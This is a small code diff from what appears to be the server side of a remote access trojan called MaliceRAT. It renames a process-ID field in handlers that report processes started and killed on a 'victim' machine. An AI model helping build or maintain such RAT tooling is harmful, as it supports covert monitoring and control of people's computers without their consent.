@@ -37,15 +37,15 @@ namespace MaliceRAT.RatServer.Features
             {
                 string displayName = message["DisplayName"].ToString();
                 string processName = message["ProcessName"].ToString();
-                int pid = message["pid"].ToObject<int>();
-                OnProcessStarted?.Invoke(victim, displayName, processName, pid);
+                int pId = message["PID"].ToObject<int>();
+                OnProcessStarted?.Invoke(victim, displayName, processName, pId);
             }
             else if (message["type"] == "pm_kill")
             {
                 string displayName = message["DisplayName"].ToString();
                 string processName = message["ProcessName"].ToString();
-                int pid = message["pid"].ToObject<int>();
-                OnProcessStopped?.Invoke(victim, displayName, processName, pid);
+                int pId = message["PID"].ToObject<int>();
+                OnProcessStopped?.Invoke(victim, displayName, processName, pId);
             }
         }
         #endregion
